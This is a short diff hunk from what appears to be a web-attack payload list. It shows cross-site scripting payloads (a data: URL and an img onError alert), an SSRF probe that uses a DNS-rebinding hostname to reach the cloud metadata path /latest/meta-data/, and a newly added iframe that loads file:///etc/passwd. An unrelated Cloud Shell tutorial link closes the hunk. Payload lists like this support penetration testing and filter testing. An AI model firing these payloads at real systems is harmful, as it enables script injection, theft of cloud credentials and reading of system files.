@@ -35,7 +35,7 @@ data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E
 
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);">
 <img src="https://7f000001.a9fea9fe.rbndr.us/latest/meta-data/" >
-
+<iframe src='file:///etc/passwd'>
 
 
 https://shell.cloud.google.com/?walkthrough_tutorial_url=https%3A%2F%2Fraw.githubusercontent.com%2Fgolang%2Ftour%2Fmaster%2Ftutorial%2Fweb-service-gin.md&pli=1&show=ide&environment_deployment=ide
